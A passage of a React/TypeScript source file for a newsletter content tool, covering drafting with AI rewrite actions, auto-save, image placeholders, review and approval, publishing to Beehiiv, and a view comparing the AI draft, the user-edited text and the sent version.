  busy: boolean;
  onFinalize: () => void;
}) {
  return (
    <Button
      variant={finalized ? "outline" : "default"}
      onClick={onFinalize}
      disabled={busy || finalized}
      className="gap-1.5"
    >
      {finalized ? <><Lock className="h-3.5 w-3.5" /> Text finalized</> : <><Lock className="h-3.5 w-3.5" /> Finalize text</>}
    </Button>
  );
}

/** Map a newsletter voice-card doc to the composer chip summary. */
function mapNewsletterVoiceCard(cards: VoiceCardDoc[] | undefined): VoiceCardSummary | null {
  if (!cards || cards.length === 0) return null;
  const card = cards[0];
  return {
    id: card._id ?? "newsletter-voice",
    // VoiceCardSummary.channel is a PlatformKey; the newsletter platform
    // key is "beehiiv" (the cnt_voice_cards.channel scope "newsletter" is
    // the query param, not this display key).
    channel: "beehiiv",
    category: card.category,
    toneAdjectives: card.voice?.tone ?? [],
    signaturePhrases: card.voice?.signaturePhrases ?? [],
    avoidPhrases: card.voice?.avoidPhrases ?? [],
    refreshedAt: card.lastGeneratedAt ?? card.updatedAt,
  };
}

/** Success-toast copy per AI op (newsletter-flavoured). */
function aiOpToast(op: AiActionContext["op"]): string {
  switch (op) {
    case "compose": return "Draft generated.";
    case "redraft": return "Newsletter rewritten.";
    case "shorten": return "Newsletter shortened.";
    case "lengthen": return "Newsletter expanded.";
    case "tone": return "Tone updated.";
    case "quote": return "Quote inserted.";
    case "disclosure": return "Disclosure inserted.";
    default: return "Done.";
  }
}

function WriteTab({ idea, ideaId, onRefresh }: { idea: IdeaDetail; ideaId: string; onRefresh: () => void }) {
  const [html, setHtml] = useState(idea.content?.html || "");
  const [subject, setSubject] = useState(idea.content?.subject || "");
  const [saving, setSaving] = useState(false);
  const [generating, setGenerating] = useState(false);
  const [progress, setProgress] = useState<StreamProgress | null>(null);
  const [preview, setPreview] = useState(false);

  // Sync local edit state when the upstream idea.content changes
  // (e.g. after generation/save). Track last-seen values; reset on change.
  const [lastSyncedHtml, setLastSyncedHtml] = useState(idea.content?.html || "");
  const [lastSyncedSubject, setLastSyncedSubject] = useState(idea.content?.subject || "");
  // Phase 2 per-placeholder image generation index. Declared with the
  // other hooks at the top — MUST be unconditional (it previously sat
  // after this component's early returns, a react-hooks/rules-of-hooks
  // violation).
  const [generatingPlaceholderIdx, setGeneratingPlaceholderIdx] = useState<number | null>(null);
  // Per-placeholder resolution busy index (paste-URL / library pick).
  const [resolvingPlaceholderIdx, setResolvingPlaceholderIdx] = useState<number | null>(null);

  // ── Shared composer chrome (parity with LinkedIn/X) ─────────────
  // The HTML body textarea + a caret tracked on every selection change
  // and on blur — emoji / AI-insert ops splice at this caret (the
  // popover/toolbar steals focus, so a live selectionStart read would
  // fall back to 0/end; capturing on blur is the fix the kit uses).
  const htmlRef = useRef<HTMLTextAreaElement>(null);
  const [caret, setCaret] = useState(0);
  const updateCaret = useCallback(() => {
    const el = htmlRef.current;
    if (el) setCaret(el.selectionStart ?? el.value.length);
  }, []);

  // Voice-card chip — newsletter category, matched like the other
  // composers. Read-only display; the rewrite skill pulls the live
  // brand voice server-side.
  const voiceCardQuery = useQuery({
    queryKey: ["voice-cards", "newsletter", idea.contentFormat ?? "newsletter"],
    queryFn: () => getVoiceCards({ channel: "newsletter" }),
    staleTime: 300_000,
  });
  const voiceSummary = useMemo(
    () => mapNewsletterVoiceCard(voiceCardQuery.data),
    [voiceCardQuery.data],
  );

  // Insert a snippet (emoji glyph or AI quote/disclosure) at the tracked
  // caret in the HTML body, then restore focus + selection. Returns the
  // new body so callers can chain. Mirrors LinkedIn/X insertSnippet.
  const insertSnippet = useCallback(
    (snippet: string): string => {
      const { text: next, caret: nextCaret } = insertAtCaret(html, caret, snippet);
      setHtml(next);
      setCaret(nextCaret);
      requestAnimationFrame(() => {
        const el = htmlRef.current;
        if (el) {
          el.focus();
          el.setSelectionRange(nextCaret, nextCaret);
        }
      });
      return next;
    },
    [html, caret],
  );

  // AI compose toolbar handler. format:"html" so the rewrite skill
  // preserves the newsletter body's semantic structure instead of
  // flattening it to prose. Replace ops swap the whole body; insert
  // ops (quote/disclosure) splice a plain-text snippet at the caret.
  const handleAiAction = useCallback(
    async (ctx: AiActionContext): Promise<string> => {
      const res = await rewriteContent({
        op: ctx.op,
        text: ctx.text,
        platform: "beehiiv",
        format: "html",
        ...(ctx.extras ? { extras: ctx.extras } : {}),
      });
      let newText: string;
      if (res.insert === true) {
        newText = insertSnippet(res.text);
      } else {
        newText = res.text;
        setHtml(newText);
      }
      toast.success(aiOpToast(ctx.op));
      return newText;
    },
    [insertSnippet],
  );

  // Auto-save the in-progress body to the idea's content. Suspended once
  // the text is finalized (the finalize stamp locks editing) and while
  // there's no body yet. Debounced 2s — same cadence as the publish
  // composers. The manual Save button stays as an explicit affordance.
  const finalizedForSave = !!(idea.content as { textFinalizedAt?: string } | undefined)?.textFinalizedAt;
  const autoSaveValue = finalizedForSave ? null : html;
  const saveBody = useCallback(
    async (value: string) => {
      await api.put(`/v1/content/ideas/${ideaId}/content`, { html: value, subject });
    },
    [ideaId, subject],
  );
  const {
    status: draftStatus,
    lastSavedAt,
    lastError: draftError,
    saveNow,
  } = useDraftSaver<string>({ value: autoSaveValue, save: saveBody });

  if (idea.content?.html && idea.content.html !== lastSyncedHtml) {
    setLastSyncedHtml(idea.content.html);
    setHtml(idea.content.html);
  }
  if (idea.content?.subject && idea.content.subject !== lastSyncedSubject) {
    setLastSyncedSubject(idea.content.subject);
    setSubject(idea.content.subject);
  }

  const generate = useCallback(async () => {
    setGenerating(true);
    setProgress(null);
    try {
      const res = await api.streamPost(`/v1/content/ideas/${ideaId}/generate-content`);
      const result = await consumeSSE(res, setProgress);
      if (result.event === "complete") {
        toast.success("Draft generated");
        onRefresh();
      }
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Content generation failed");
    }
    setGenerating(false);
    setProgress(null);
  }, [ideaId, onRefresh]);

  if (!idea.brief) return <Card><CardContent className="py-12 text-center text-muted-foreground">Generate a brief first.</CardContent></Card>;

  if (!idea.content?.html && !html) {
    return (
      <Card>
        <CardContent className="py-12 text-center">
          {generating ? (
            <>
              <Loader2 className="mx-auto mb-3 h-10 w-10 animate-spin text-primary" />
              <p className="mb-1 font-medium">Writing first draft...</p>
              {progress && (
                <p className="text-sm text-muted-foreground animate-pulse">
                  Step {progress.step}: {progress.label}
                </p>
              )}
            </>
          ) : (
            <>
              <Pen className="mx-auto mb-3 h-10 w-10 text-muted-foreground/30" />
              <p className="mb-4 text-muted-foreground">AI will write the first draft from your brief.</p>
              <Button onClick={generate}>
                <Sparkles className="mr-1.5 h-4 w-4" />
                Generate First Draft
              </Button>
            </>
          )}
        </CardContent>
      </Card>
    );
  }

  async function handleSave() {
    setSaving(true);
    try {
      await api.put(`/v1/content/ideas/${ideaId}/content`, { html, subject });
      toast.success("Content saved");
      onRefresh();
    } catch {
      toast.error("Save failed");
    }
    setSaving(false);
  }

  // Image placeholder + Finalize wiring (PR 11). Both write back via
  // the existing /content PUT endpoint — keeps the route surface
  // minimal. Deletion filters the array; finalize sets a stamp the
  // backend reads when Phase 2 image-gen UI ships.
  const placeholders = idea.content?.imagePlaceholders ?? [];
  const finalized = !!(idea.content as { textFinalizedAt?: string } | undefined)?.textFinalizedAt;
  async function handleDeletePlaceholder(index: number) {
    setSaving(true);
    try {
      const next = placeholders.filter((_, i) => i !== index);
      await api.put(`/v1/content/ideas/${ideaId}/content`, { imagePlaceholders: next });
      toast.success("Placeholder removed");
      onRefresh();
    } catch {
      toast.error("Failed to remove placeholder");
    }
    setSaving(false);
  }
  async function handleFinalize() {
    setSaving(true);
    try {
      await api.put(`/v1/content/ideas/${ideaId}/content`, { textFinalizedAt: new Date().toISOString() });
      toast.success("Text finalized — Images stage unlocks next");
      onRefresh();
    } catch {
      toast.error("Failed to finalize");
    }
    setSaving(false);
  }

  // Phase 2: per-placeholder AI image generation. Hard-gated on
  // textFinalizedAt by the api (returns 400 TEXT_NOT_FINALIZED if
  // user clicks Generate before Finalize). UI also disables the
  // button when !finalized so the gate is enforced both sides.
  // (state declared with the other hooks at the top — see note there.)
  async function handleGeneratePlaceholder(index: number) {
    setGeneratingPlaceholderIdx(index);
    try {
      await api.post(`/v1/content/ideas/${ideaId}/placeholders/${index}/generate`, {});
      toast.success(`Image ${index + 1} generated`);
      onRefresh();
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Image generation failed");
    }
    setGeneratingPlaceholderIdx(null);
  }

  // Resolve a placeholder by SUPPLYING an external URL (status
  // "supplied") or PICKING from the media library (status "uploaded").
  // Both write the chosen URL onto the placeholder via the same /content
  // PUT the rest of the rail uses. Gated on finalize like Generate, so
  // images are only resolved once the text is locked.
  async function handleResolvePlaceholder(
    index: number,
    resolvedImageUrl: string,
    status: "supplied" | "uploaded",
  ) {
    setResolvingPlaceholderIdx(index);
    try {
      const next = placeholders.map((p, i) =>
        i === index ? { ...p, resolvedImageUrl, status } : p,
      );
      await api.put(`/v1/content/ideas/${ideaId}/content`, { imagePlaceholders: next });
      toast.success(`Image ${index + 1} set`);
      onRefresh();
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Failed to set image");
    }
    setResolvingPlaceholderIdx(null);
  }

  const citations = idea.content?.dataCitations;
  const isNewsletter = !idea.contentFormat || idea.contentFormat === "newsletter";

  return (
    <div className={citations?.length ? "grid gap-4 lg:grid-cols-[1fr_320px]" : ""}>
      {/* Routed through the shared <ComposerShell> for cross-surface
          consistency with LinkedIn / X. Voice chip + AI toolbar mounted;
          the AI toolbar is gated to Edit mode (it operates on the HTML
          body, which Preview doesn't expose for editing) and suppressed
          once the text is finalized. format:"html" keeps the rewrite
          from flattening the newsletter's semantic structure. The
          mid-column Save/Regenerate/Finalize row + image rail stay as
          children to preserve the existing order. */}
      <ComposerShell
        mode="compose"
        voiceCard={voiceSummary}
        toolbarSlot={
          !preview && !finalized ? (
            <AiComposeToolbar
              text={html}
              platform="beehiiv"
              onAiAction={handleAiAction}
            />
          ) : undefined
        }
      >
        {/* Subject line only for newsletter format. Article / PR /
            advertorial outputs don't carry a subject; their headline
            is in the HTML body already (write_article/pr/advertorial
            emit subject = headline as a back-compat shim). */}
        {isNewsletter ? (
          <div>
            <label className="mb-1.5 block text-xs font-medium text-muted-foreground">Subject Line</label>
            <Input value={subject} onChange={(e) => setSubject(e.target.value)} placeholder="Email subject line..." />
          </div>
        ) : (
          <div className="rounded-md border bg-muted/30 p-3 text-xs text-muted-foreground">
            Format: <span className="font-medium text-foreground">{idea.contentFormat}</span>. Headline + metadata stamped on content; edit them in the body / dedicated panels below.
          </div>
        )}
        <div>
          <div className="mb-1.5 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <button
                type="button"
                onClick={() => setPreview(false)}
                className={`text-xs font-medium px-2 py-1 rounded transition-colors ${!preview ? "bg-accent text-accent-foreground" : "text-muted-foreground hover:text-foreground"}`}
              >
                <Pen className="mr-1 inline h-3 w-3" />Edit
              </button>
              <button
                type="button"
                onClick={() => setPreview(true)}
                className={`text-xs font-medium px-2 py-1 rounded transition-colors ${preview ? "bg-accent text-accent-foreground" : "text-muted-foreground hover:text-foreground"}`}
              >
                <Eye className="mr-1 inline h-3 w-3" />Preview
              </button>
            </div>
            <div className="flex items-center gap-3 text-xs text-muted-foreground">
              {idea.content?.wordCount != null && <span>{idea.content.wordCount} words · v{idea.content.version}</span>}
            </div>
          </div>
          {preview ? (
            <div
              className="w-full min-h-[30rem] rounded-md border bg-background p-6 prose prose-sm dark:prose-invert max-w-none overflow-auto"
              dangerouslySetInnerHTML={{ __html: sanitizeContentHtml(html) }}
            />
          ) : (
            <textarea
              ref={htmlRef}
              value={html}
              onChange={(e) => { setHtml(e.target.value); setCaret(e.target.selectionStart ?? e.target.value.length); }}
              onSelect={updateCaret}
              onClick={updateCaret}
              onKeyUp={updateCaret}
              // Capture caret on blur too — the emoji popover / AI insert
              // buttons steal focus, and selectionStart still holds the
              // last position at blur time. Without this an insert lands
              // at 0/end (the kit-wide emoji bug).
              onBlur={updateCaret}
              rows={20}
              className="w-full rounded-md border bg-background p-4 font-mono text-sm outline-none focus:ring-1 focus:ring-ring"
              placeholder="Newsletter content (HTML)..."
            />
          )}
        </div>
        <div className="flex flex-wrap gap-2 items-center">
          <Button onClick={handleSave} disabled={saving || finalized}>
            {saving && <Loader2 className="mr-1.5 h-4 w-4 animate-spin" />}Save
          </Button>
          <Button variant="outline" onClick={generate} disabled={generating || finalized}>
            {generating ? <Loader2 className="mr-1.5 h-4 w-4 animate-spin" /> : <Sparkles className="mr-1.5 h-4 w-4" />}
            Regenerate
          </Button>
          {/* Emoji insert — only in Edit mode (operates on the textarea
              caret) and before finalize. */}
          {!preview && !finalized && <EmojiPickerTrigger onInsert={insertSnippet} />}
          {/* Auto-save status pill — sits next to the manual Save so the
              user sees the debounced save land. */}
          <DraftSaver
            status={draftStatus}
            lastSavedAt={lastSavedAt}
            lastError={draftError}
            onRetry={saveNow}
          />
          <div className="ml-auto">
            <FinalizeButton finalized={finalized} busy={saving} onFinalize={handleFinalize} />
          </div>
        </div>
        <ImagePlaceholderRail
          placeholders={placeholders}
          onDelete={handleDeletePlaceholder}
          onGenerate={handleGeneratePlaceholder}
          onSupplyUrl={(i, url) => handleResolvePlaceholder(i, url, "supplied")}
          busy={saving}
          finalized={finalized}
          generatingIndex={generatingPlaceholderIdx}
          resolvingIndex={resolvingPlaceholderIdx}
        />
      </ComposerShell>
      {citations?.length ? <DataCitationsPanel citations={citations} /> : null}
    </div>
  );
}

function ReviewTab({ idea, loading, onSubmitReview, onApprove, onReject }: { idea: IdeaDetail; loading: string | null; onSubmitReview: () => void; onApprove: () => void; onReject: (n: string) => Promise<void> }) {
  const [rejectOpen, setRejectOpen] = useState(false);

  if (["brainstorm", "planned", "writing", "brief_ready"].includes(idea.status)) {
    return (
      <Card>
        <CardContent className="py-12 text-center">
          <Send className="mx-auto mb-3 h-10 w-10 text-muted-foreground/30" />
          <p className="mb-4 text-muted-foreground">{idea.content?.html ? "Submit for review when ready." : "Write the content first."}</p>
          {idea.content?.html && (
            <Button onClick={onSubmitReview} disabled={loading === "submit-review"}>
              {loading === "submit-review" ? <Loader2 className="mr-1.5 h-4 w-4 animate-spin" /> : <Send className="mr-1.5 h-4 w-4" />}
              Submit for Review
            </Button>
          )}
        </CardContent>
      </Card>
    );
  }

  if (idea.status === "review") {
    return (
      <div className="space-y-4">
        {/* Content preview */}
        {idea.content?.html && (
          <Card>
            <CardHeader>
              <CardTitle className="text-sm">Content Preview</CardTitle>
              {idea.content.subject && <CardDescription>{idea.content.subject}</CardDescription>}
            </CardHeader>
            <CardContent>
              <div
                className="prose prose-sm dark:prose-invert max-w-none max-h-96 overflow-auto"
                dangerouslySetInnerHTML={{ __html: sanitizeContentHtml(idea.content.html) }}
              />
            </CardContent>
          </Card>
        )}

        {/* Data citations for review */}
        {idea.content?.dataCitations?.length ? <DataCitationsPanel citations={idea.content.dataCitations} /> : null}

        {/* Approval actions */}
        <Card>
          <CardHeader><CardTitle>Verdict</CardTitle><CardDescription>Approve or request revisions.</CardDescription></CardHeader>
          <CardContent className="space-y-4">
            {idea.review?.verdict === "revision_requested" && idea.review.notes && (
              <div className="rounded-md border-destructive/20 bg-destructive/5 p-3 text-sm"><p className="text-xs text-muted-foreground mb-1">Previous revision notes</p>{idea.review.notes}</div>
            )}
            <div className="flex gap-2">
              <Button onClick={onApprove} disabled={loading === "approve"} className="bg-emerald-600 hover:bg-emerald-500">
                {loading === "approve" ? <Loader2 className="mr-1.5 h-4 w-4 animate-spin" /> : <CheckCircle className="mr-1.5 h-4 w-4" />}Approve
              </Button>
              <Button variant="outline" onClick={() => setRejectOpen(true)} disabled={loading === "reject-review"} className="text-destructive border-destructive/30">
                <XCircle className="mr-1.5 h-4 w-4" />Request revisions
              </Button>
            </div>
          </CardContent>
        </Card>
        {/* Free-text only — content review feedback is too varied for
            canned reasons. The dialog still gives us 3-char min, length
            cap, focus management, and submit-spinner over the previous
            inline Input. */}
        <RejectReasonDialog
          open={rejectOpen}
          onOpenChange={setRejectOpen}
          // `title` is overridden below, so `targetLabel` is unused
          // for display. Empty string instead of `idea.title` makes
          // the non-reliance explicit.
          targetLabel=""
          title="Request revisions"
          description="Notes for the next revision pass — they'll appear on the draft when reopened."
          cannedReasons={[]}
          onSubmit={onReject}
        />
      </div>
    );
  }

  return <Card><CardContent className="py-8"><div className="flex items-center gap-2"><CheckCircle className="h-5 w-5 text-emerald-500" /><span className="font-medium">{idea.review?.verdict === "approved" ? "Approved" : "Reviewed"}</span></div>{idea.review?.notes && <p className="mt-2 text-sm text-muted-foreground">{idea.review.notes}</p>}</CardContent></Card>;
}

function DataCitationsPanel({ citations }: { citations: NonNullable<IdeaDetail["content"]>["dataCitations"] }) {
  if (!citations?.length) return null;

  const verified = citations.filter((c) => c.confidence === "verified").length;
  const inferred = citations.filter((c) => c.confidence === "inferred").length;
  const estimated = citations.filter((c) => c.confidence === "ai_estimated").length;

  return (
    <Card>
      <CardHeader>
        <CardTitle className="text-sm flex items-center gap-2">
          Data Sources
          <Badge variant={estimated === 0 ? "default" : "secondary"} className="text-[10px]">
            {verified} verified · {inferred} inferred · {estimated} unverified
          </Badge>
        </CardTitle>
        <CardDescription>Review each data point before publishing</CardDescription>
      </CardHeader>
      <CardContent>
        <ul className="space-y-3">
          {citations.map((c, i) => {
            const borderColor = c.confidence === "verified" ? "border-emerald-500" : c.confidence === "inferred" ? "border-amber-500" : "border-red-400";
            return (
              <li key={i} className={`border-l-2 pl-3 text-sm ${borderColor}`}>
                <p>{c.claim}</p>
                <div className="mt-1 flex items-center gap-2 text-xs text-muted-foreground">
                  <Badge variant={c.confidence === "verified" ? "default" : c.confidence === "inferred" ? "secondary" : "destructive"} className="text-[10px]">{c.confidence}</Badge>
                  {c.source && c.sourceUrl ? (
                    <a href={c.sourceUrl} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline flex items-center gap-1">{c.source} <ExternalLink className="h-3 w-3" /></a>
                  ) : c.source ? (
                    <span>{c.source}</span>
                  ) : null}
                </div>
              </li>
            );
          })}
        </ul>
      </CardContent>
    </Card>
  );
}

function PublishTab({ idea, loading, onPublish, onScheduled }: { idea: IdeaDetail; loading: string | null; onPublish: () => void; onScheduled: () => void }) {
  const { formatDateTime } = useLocale();

  if (idea.publishing?.beehiivPostId) {
    return (
      <Card>
        <CardContent className="py-8">
          <div className="flex items-center gap-2"><CheckCircle className="h-5 w-5 text-green-500" /><span className="font-medium">Published to Beehiiv</span></div>
          {idea.publishing.publishedAt && <p className="mt-1 text-sm text-muted-foreground">Published {formatDateTime(idea.publishing.publishedAt)}</p>}
          {idea.publishing.beehiivUrl && <a href={idea.publishing.beehiivUrl} target="_blank" rel="noopener noreferrer" className="mt-3 inline-flex items-center gap-1.5 text-sm text-primary hover:underline"><ExternalLink className="h-3.5 w-3.5" />View on Beehiiv</a>}
        </CardContent>
      </Card>
    );
  }

  if (!["approved", "scheduled"].includes(idea.status)) {
    return <Card><CardContent className="py-12 text-center text-muted-foreground">Content must be approved before publishing.</CardContent></Card>;
  }

  const html = idea.content?.html ?? "";
  const subject = idea.content?.subject?.trim() || idea.title || "Untitled";

  if (!html) {
    return <Card><CardContent className="py-12 text-center text-muted-foreground">No content to publish yet. Generate the newsletter in the Write step first.</CardContent></Card>;
  }

  // Newsletter channel = the W8 Beehiiv publisher adapter (channel key
  // "newsletter"). It REQUIRES channelOptions.title and reads
  // channelOptions.contentHtml; payload.text is the fallback body. At
  // the scheduled tick the publish-scheduled cron creates a Beehiiv
  // DRAFT (same artefact as "Push to Beehiiv" below — Beehiiv free tier
  // has no server-side send), which the user then sends from Beehiiv.
  const hash = sourceTextHash(html);
  const schedulerSource = {
    sourceType: "idea" as ScheduleSourceType,
    sourceRef: idea._id,
    sourceTextHash: hash,
  };
  const schedulerChannels = [
    {
      channel: "newsletter",
      payload: {
        text: html,
        channelOptions: {
          title: subject,
          contentHtml: html,
          ...(idea.content?.previewText ? { previewText: idea.content.previewText } : {}),
        },
      },
    },
  ];

  return (
    <Card>
      <CardHeader>
        <CardTitle>Schedule &amp; Publish</CardTitle>
        <CardDescription>
          Schedule the newsletter to post automatically, or push it to Beehiiv as a draft now.
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        {/* Schedule via the shared W8 scheduler — replaces the old
            datetime-local stamp, which never actually published. */}
        <SchedulerComposer
          key={hash}
          source={schedulerSource}
          title={subject}
          channels={schedulerChannels}
          onScheduled={onScheduled}
        />
        <div className="border-t pt-4">
          <p className="mb-3 text-sm text-muted-foreground">Or push as a draft to Beehiiv right now. You can finalize and send from your Beehiiv dashboard.</p>
          <Button onClick={onPublish} disabled={loading === "publish"}>
            {loading === "publish" ? <Loader2 className="mr-1.5 h-4 w-4 animate-spin" /> : <Send className="mr-1.5 h-4 w-4" />}
            Push to Beehiiv
          </Button>
        </div>
      </CardContent>
    </Card>
  );
}

/**
 * Versions tab — 3-column side-by-side of aiOriginal / userEdited /
 * sent with the AI contribution % badge from segmentDiff. Owner /
 * admin / editor visible per locked decision L7 — this is the
 * credibility surface for "the AI did N% of this, you tailored M%".
 *
 * Reads GET /v1/content/ideas/:id/versions. When versions.sent is
 * absent, falls back to 2-column (Original / Current editor) with
 * the legacy in-editor aiAcceptanceRate.
 *
 * Per-paragraph color bands not rendered in v1 — segmentDiff data
 * is fetched and the headline % is computed from it, but the
 * detailed segment annotations are deferred to a follow-up
 * <SegmentDiffView> atomic. The headline scalar covers the L7
 * use case; the granular gutter view is incremental polish.
 */
function VersionsTab({ ideaId }: { ideaId: string }) {
  type VersionSnapshot = {
    html?: string;
    plainText?: string;
    wordCount?: number;
    generatedAt?: string;
    sentAt?: string;
    capturedAt?: string;
    writerSkill?: string;
  };
  type VersionsResponse = {
    ideaId: string;
    title: string;
    contentFormat: string | null;
    versions: {
      aiOriginal: VersionSnapshot | null;
      userEdited: VersionSnapshot | null;
      sent: VersionSnapshot | null;
    };
    inEditor: {
      html: string | null;
      plainText: string | null;
      wordCount: number | null;
      lastEditedAt: string | null;
      version: number | null;
    };
    segmentDiff: Array<{
      band: "kept" | "lightly_edited" | "rewritten" | "removed" | "added";
      aiText?: string;
      sentText?: string;
      wordCount: number;
      paragraphIndex: number;
    }>;
    finalAcceptanceRate: number | null;
    finalEditCount: number | null;
    aiAcceptanceRate: number | null;
  };

  const { data, isLoading, error } = useQuery({
    queryKey: ["idea-versions", ideaId],
    queryFn: () => api.get<VersionsResponse>(`/v1/content/ideas/${ideaId}/versions`),
  });

  if (isLoading) {
    return (
      <Card>
        <CardContent className="py-12 text-center">
          <Loader2 className="mx-auto h-6 w-6 animate-spin text-muted-foreground" />
        </CardContent>
      </Card>
    );
  }

  if (error || !data) {
    return (
      <Card>
        <CardContent className="py-12 text-center text-sm text-muted-foreground">
          Failed to load versions. {error instanceof Error ? error.message : ""}
        </CardContent>
      </Card>
    );
  }

  const hasSent = !!data.versions.sent;
  const aiContribPct = typeof data.finalAcceptanceRate === "number"
    ? Math.round(data.finalAcceptanceRate * 100)
    : typeof data.aiAcceptanceRate === "number"
      ? Math.round(data.aiAcceptanceRate * 100)
      : null;

  const bandStats = data.segmentDiff.reduce(
    (acc, e) => {
      acc[e.band] = (acc[e.band] ?? 0) + e.wordCount;
      return acc;
    },
    {} as Record<string, number>,
  );
  const totalSentWords = Object.values(bandStats).reduce((s, n) => s + n, 0);
  const bandPct = (b: string) =>
    totalSentWords > 0 ? Math.round(((bandStats[b] ?? 0) / totalSentWords) * 100) : 0;

  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle className="text-sm flex items-center gap-2">
            <GitCompare className="h-4 w-4" /> AI contribution
            {aiContribPct !== null && (
              <Badge variant={aiContribPct >= 70 ? "default" : aiContribPct >= 40 ? "secondary" : "destructive"} className="ml-1 text-xs">
                {aiContribPct}%
              </Badge>
            )}
          </CardTitle>
          <CardDescription className="text-xs">
            {hasSent
              ? "Computed from the version subscribers actually received vs the AI's original draft."
              : aiContribPct !== null
                ? "In-editor similarity vs the AI's original draft. Final number lands once the post is sent in Beehiiv."
                : "AI contribution % will appear here once the post is sent in Beehiiv."}
          </CardDescription>
        </CardHeader>
        {data.segmentDiff.length > 0 && (
          <CardContent>
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {[
                { key: "kept", label: "Kept", color: "bg-emerald-500" },
                { key: "lightly_edited", label: "Tweaked", color: "bg-amber-500" },
                { key: "rewritten", label: "Rewritten", color: "bg-red-500" },
                { key: "added", label: "Added by you", color: "bg-blue-500" },
              ].map((b) => (
                <div key={b.key} className="rounded-md border bg-muted/20 p-3">
                  <div className="flex items-center justify-center gap-1.5 mb-1">
                    <span className={`h-2 w-2 rounded-full ${b.color}`} aria-hidden />
                    <span className="text-xs text-muted-foreground">{b.label}</span>
                  </div>
                  <p className="text-lg font-semibold">{bandPct(b.key)}%</p>
                </div>
              ))}
            </div>
            {(data.finalEditCount ?? 0) > 0 && (
              <p className="text-xs text-muted-foreground mt-3 text-center">
                {data.finalEditCount} paragraph(s) changed between AI draft and sent version.
              </p>
            )}
          </CardContent>
        )}
      </Card>

      <div className={`grid gap-4 ${hasSent ? "lg:grid-cols-3" : "lg:grid-cols-2"}`}>
        <VersionColumn
          label="AI Original"
          sublabel={data.versions.aiOriginal?.writerSkill ? `via ${data.versions.aiOriginal.writerSkill}` : "What we generated"}
          tone="bg-emerald-50 dark:bg-emerald-950/30 border-emerald-200 dark:border-emerald-900"
          html={data.versions.aiOriginal?.html ?? null}
          wordCount={data.versions.aiOriginal?.wordCount}
          timestamp={data.versions.aiOriginal?.generatedAt}
          timestampLabel="Generated"
        />
        <VersionColumn
          label="You Edited"
          sublabel="Latest state in our editor or Beehiiv"
          tone="bg-amber-50 dark:bg-amber-950/30 border-amber-200 dark:border-amber-900"
          html={data.versions.userEdited?.html ?? data.inEditor.html}
          wordCount={data.versions.userEdited?.wordCount ?? data.inEditor.wordCount ?? undefined}
          timestamp={data.versions.userEdited?.capturedAt ?? data.inEditor.lastEditedAt ?? undefined}
          timestampLabel="Last edit"
        />
        {hasSent && (
          <VersionColumn
            label="Actually Sent"
            sublabel="What subscribers received"
            tone="bg-blue-50 dark:bg-blue-950/30 border-blue-200 dark:border-blue-900"
            html={data.versions.sent?.html ?? null}
            wordCount={data.versions.sent?.wordCount}
            timestamp={data.versions.sent?.sentAt}
            timestampLabel="Sent"
          />
        )}
      </div>
    </div>
  );
}

function VersionColumn({
  label,
  sublabel,
  tone,
  html,
  wordCount,
  timestamp,
  timestampLabel,
}: {
  label: string;
  sublabel?: string;
  tone: string;
  html: string | null;
  wordCount?: number;
  timestamp?: string;
  timestampLabel?: string;
}) {
  return (
    <Card>
      <CardHeader className={`${tone} border-b rounded-t-lg py-3`}>
        <CardTitle className="text-sm">{label}</CardTitle>
        {sublabel && <CardDescription className="text-[11px]">{sublabel}</CardDescription>}
        <div className="text-[10px] text-muted-foreground mt-1 flex items-center gap-2">
          {typeof wordCount === "number" && <span>{wordCount} words</span>}
          {timestamp && (
            <>
              <span aria-hidden>·</span>
              <span>{timestampLabel}: {new Date(timestamp).toLocaleString()}</span>
            </>
          )}
        </div>
      </CardHeader>
      <CardContent className="max-h-[36rem] overflow-y-auto p-4">
        {html
          ? <div className="prose prose-sm dark:prose-invert max-w-none" dangerouslySetInnerHTML={{ __html: sanitizeContentHtml(html) }} />
          : <p className="text-xs text-muted-foreground italic">Not available.</p>}
      </CardContent>
    </Card>
  );
}

